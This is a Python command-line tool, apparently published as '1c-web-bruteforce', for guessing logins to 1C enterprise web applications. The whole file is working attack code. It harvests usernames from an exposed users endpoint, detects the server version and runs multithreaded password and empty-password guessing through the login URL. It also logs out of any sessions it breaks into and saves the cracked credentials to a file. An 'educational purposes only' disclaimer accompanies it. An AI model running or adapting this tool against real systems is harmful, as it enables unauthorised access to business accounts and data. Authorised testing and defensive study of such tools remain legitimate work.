#!/usr/bin/env python

from time import sleep, strftime
import sys
import argparse
import base64
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Optional
import requests
import urllib3
import dataclasses
import logging
import re
import enum
import pathlib

logging.getLogger('urllib3').setLevel(logging.WARNING)
logger = logging.getLogger(__name__)
logging.basicConfig(level=logging.DEBUG)


class PrintColors(enum.Enum):
    """
    Colors for printing
    """

    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def return_logo():
    return (
        f"{PrintColors.WARNING.value}"
        "   /$$    /$$$$$$        /$$                             /$$              \n"  # noqa
        " /$$$$   /$$__  $$      | $$                            | $$              \n"  # noqa
        "|_  $$  | $$  \__/      | $$$$$$$   /$$$$$$  /$$   /$$ /$$$$$$    /$$$$$$\n"  # noqa
        "  | $$  | $$            | $$__  $$ /$$__  $$| $$  | $$|_  $$_/   /$$__  $$\n"  # noqa
        "  | $$  | $$            | $$  \ $$| $$  \__/| $$  | $$  | $$    | $$$$$$$$\n"  # noqa
        "  | $$  | $$    $$      | $$  | $$| $$      | $$  | $$  | $$ /$$| $$_____/\n"  # noqa
        " /$$$$$$|  $$$$$$/      | $$$$$$$/| $$      |  $$$$$$/  |  $$$$/|  $$$$$$$\n"  # noqa
        "|______/ \______//$$$$$$|_______/ |__/       \______/    \___/   \_______/\n"  # noqa
        "                |______/                                                 \n"  # noqa
        f"{PrintColors.ENDC.value}       v 1.0\n"
        "       by evtdanya -> https://github.com/EvtDanya/1c-web-bruteforce\n"  # noqa
        "\n"
        f"{PrintColors.FAIL.value}       DISCLAIMER: This tool is intended for educational purposes only.\n"  # noqa
        f"       The author is not responsible for any illegal use of this software.{PrintColors.ENDC.value}\n"  # noqa
    )


def config_logging(level=logging.INFO):
    logging.basicConfig(
        format='%(asctime)s - %(levelname)s - %(message)s',
        level=level
    )


class Verbosity(enum.Enum):
    DEBUG = logging.DEBUG
    INFO = logging.INFO

    @classmethod
    def from_str(cls, value: str):
        try:
            return cls[value.upper()]
        except KeyError:
            raise ValueError(f"Invalid verbosity level: {value}")


class CustomHelpFormatter(argparse.HelpFormatter):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    def format_help(self) -> str:
        help_text = super().format_help()
        return f"{return_logo()}\n{help_text}"


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="1C Web interface bruteforce",
        epilog="Example: python ./1c_brute.py <url> <users_file> <passwords_file>",  # noqa
        formatter_class=CustomHelpFormatter
    )

    parser.add_argument(
        "Target",
        metavar="target",
        type=str,
        help="The target URI with directory of 1C webapp. Example: https://localhost/docCorp"  # noqa
    )

    parser.add_argument(
        "Username",
        metavar="users",
        type=pathlib.Path,
        help="The usernames list",
        nargs="?"
    )

    parser.add_argument(
        "Passwords",
        metavar="passwords",
        type=pathlib.Path,
        help="The passwords list",
        nargs="?"
    )

    parser.add_argument(
        "--delay",
        type=int,
        metavar="ms",
        help="Time in milliseconds between each request",
        default=5
    )

    parser.add_argument(
        "--startat",
        type=int,
        metavar="N",
        help="Start at this line in the file",
        default=0
    )

    parser.add_argument(
        "--threads",
        type=int,
        metavar="N",
        help="Workers for bruteforce",
        default=10
    )

    parser.add_argument(
        "--check-empty-passwords",
        action="store_true",
        help="Check for users with empty passwords"
    )

    parser.add_argument(
        "--save-results",
        action="store_true",
        help="Save results to file 'results.txt'"
    )

    parser.add_argument(
        "--get-users",
        action="store_true",
        help="Auto get and parse users from <target_url>/e1cib/users"
    )

    parser.add_argument(
        "--version",
        type=str,
        metavar="version",
        help="Version of 1C",
        default=None
    )

    parser.add_argument(
        "--verbosity",
        metavar="verbosity",
        type=Verbosity.from_str,
        choices=list(Verbosity),
        help="Set the logging verbosity level (DEBUG, INFO)",
        default=Verbosity.INFO
    )

    args = parser.parse_args()
    config_logging(level=args.verbosity.value)

    return args


@dataclasses.dataclass()
class ExploitConfig(object):
    """
    Config with params for bruteforce
    """

    target: str
    startAt: int
    delay: int
    check_empty_passwords: bool
    get_users: bool
    save_results: bool

    usernames_file: Optional[pathlib.Path] = None
    passwords_file: Optional[pathlib.Path] = None
    threads: int = 10
    version: Optional[str] = None
    lang: str = "ru_RU"
    clnId: str = "84c3db7e-661b-9350-57ac-7164384e6c43"

    @property
    def reset_url(self) -> str:
        return f"{self.target}/{self.lang}/e1cib/logout"

    @property
    def reset_data(self) -> dict:
        return {"root": "{}"}


class FileHandler(object):
    """
    Class for managing operations with text files
    """

    @staticmethod
    def load(filename: pathlib.Path) -> List[str]:
        """
        Load strings from file

        :param filename: file data getting
        :type filename: pathlib.Path
        :return: list of strings
        :rtype: List[str]
        """
        try:
            with filename.open("r", encoding="UTF-8") as file:
                data = [line.strip() for line in file.readlines()]
            logging.info(f"[i] Data loaded from '{filename}'")
            return data
        except IOError as e:
            logging.error(f"[!] Error loading file '{filename}': {e}")
            return []

    @staticmethod
    def save_line(filename: pathlib.Path, data: str):
        """
        Append string to the end of provided file

        :param filename: file for data saving
        :type filename: pathlib.Path
        :param data: data to save
        :type data: str
        """
        try:
            with filename.open("a", encoding="UTF-8") as file:
                file.write(f"{data}\n")
            logging.info(f"[i] Data saved to '{filename}'")
        except IOError as e:
            logging.error(f"[!] Error saving to file '{filename}': {e}")


class Exploit(object):
    """
    Class for bruteforce
    """

    config: ExploitConfig = None
    found_credentials: List[str] = []

    def __init__(self, config: ExploitConfig):
        self.config = config
        self.found_credentials = []
        if not self.config.version:
            self.config.version = self._determine_version()

    def _get_users(self) -> List[str]:
        """
        Send request to get users

        :return: list of users in system
        :rtype: List[str]
        """
        url = f"{self.config.target}/{self.config.lang}/e1cib/users"
        try:
            response = requests.get(url)
            response.raise_for_status()

            user_data = response.text
            users = user_data.splitlines()
            logger.info(f"Retrieved {len(users)} users from the target.")

            return users

        except Exception as e:
            logger.exception(
                "[!] Unable to get users. Try again or provide users manually!"
                f" {e}"
            )
            sys.exit(1)

    def _prepare_cred(self, login: str, password: Optional[str] = None) -> str:
        """
        Encode in base64 login and password for request

        :param login: login for encoding
        :type login: str
        :param password: passwords for encoding, defaults to None
        :type password: Optional[str], optional
        :return: encoded cred
        :rtype: str
        """
        credentials = f"{login}:{password}" if password else f"{login}"
        return base64.b64encode(
            credentials.encode("utf-8")
        ).decode("utf-8")

    def _determine_version(self) -> str:
        url = f"{self.config.target}/"
        try:
            response = requests.post(url)
            version_match = re.search(
                r'var VERSION = "([\d.]+)"',
                response.text
            )
            if version_match:
                version = version_match.group(1)
                logger.info(f"Version found: {version}")
                return version

            logger.error(
                "[!] Unable to determine version."
                "Provide version manually with '--verion <version>'"
            )
            sys.exit(1)
        except Exception as e:
            logger.exception(f"Error determining version: {e}")
            sys.exit(1)

    def _brute(self, login: str, password: str):
        """
        Send request with provided login and password

        :param login: login to try
        :type login: str
        :param password: password to try
        :type password: str
        """
        cred = self._prepare_cred(login, password)
        url = f"{self.config.target}/{self.config.lang}/e1cib/login?version={self.config.version}&cred={cred}&vl={self.config.lang}&clnId={self.config.clnId}"  # noqa
        try:
            response = requests.post(url)
            logging.debug(f"[{response.status_code}] {login}:{password}")
            match response.status_code:
                case 200:
                    logging.info(
                        f"{PrintColors.OKGREEN.value}"
                        f"[+] Success: {login}:{password}"
                        f"{PrintColors.ENDC.value}"
                    )
                    self.found_credentials.append(f"{login}:{password}")
                    cookie = response.headers.get(
                        "Set-Cookie", ""
                    ).split(";")[0]
                    if cookie:
                        requests.post(
                            self.config.reset_url,
                            headers={"Cookie": cookie},
                            json=self.config.reset_data
                        )
                    if self.config.save_results:
                        FileHandler.save_line(
                            filename=pathlib.Path("results.txt"),
                            data=f"{login}:{password}"
                        )
                case 400:
                    logging.error(
                        "[!] No free license for new user's session, try later"
                    )
                    sys.exit(1)

            sleep(self.config.delay / 1000)

        except requests.exceptions.RequestException as e:
            logging.exception(f"[!] Request error: {e}")
        except KeyboardInterrupt:
            pass
        except Exception as e:
            logging.exception(f"[!] Other error: {e}")

    def start_exploit(self) -> List[str]:
        """
        Start bruteforce

        :return: found credentials
        :rtype: List[str]
        """
        users = (
            FileHandler.load(
                self.config.usernames_file
            )[self.config.startAt:]
            if (
                self.config.usernames_file
                and not self.config.get_users
            )
            else self._get_users()
        )
        if not users:
            logging.error("[!] No users provided. Shutting down")
            sys.exit(1)

        passwords = (
            FileHandler.load(self.config.passwords_file)
            if (
                self.config.passwords_file
                and not self.config.check_empty_passwords
            )
            else [""]
        )
        logging.info(
            f"[i] Starting with {len(users)} users"
            f" and {len(passwords)} passwords"
        )

        with ThreadPoolExecutor(max_workers=self.config.threads) as executor:
            futures = [
                executor.submit(self._brute, user, password)
                for user
                in users
                for password
                in passwords
            ]
            try:
                for future in as_completed(futures):
                    future.result()
            except KeyboardInterrupt:
                logging.info("[*] Interrupted by user. Shutting down...")
                for future in futures:
                    future.cancel()
                executor.shutdown(wait=False)
                sys.exit(1)
            except Exception as e:
                logger.exception(f"[!] Error: {e}")

        return self.found_credentials


def main():
    args = parse_args()
    if not args.check_empty_passwords and not args.Passwords:
        logger.error(
            "No passwords file provided and 'check-empty-passwords'"
            " is not enabled. Exiting..."
        )
        sys.exit(1)

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    config = ExploitConfig(
        target=args.Target,
        usernames_file=args.Username,
        passwords_file=args.Passwords,
        startAt=args.startat,
        delay=args.delay,
        check_empty_passwords=args.check_empty_passwords,
        get_users=args.get_users,
        version=args.version,
        threads=args.threads,
        save_results=args.save_results
    )

    exploit = Exploit(config)

    logging.info(
        f"[i] Bruteforce started at {strftime('%d-%m-%Y %H:%M:%S %Z')}"
    )
    found_credentials = exploit.start_exploit()
    logging.info(
        f"[i] Bruteforce completed at {strftime('%d-%m-%Y %H:%M:%S %Z')}"
    )
    logging.info(f"[i] Found {len(found_credentials)} password(s).")

    if found_credentials:
        logging.info("[*] Credentials found:")
        for cred in found_credentials:
            logging.info(
                f"{PrintColors.OKGREEN.value}{cred}{PrintColors.ENDC.value}"
            )


if __name__ == "__main__":
    main()
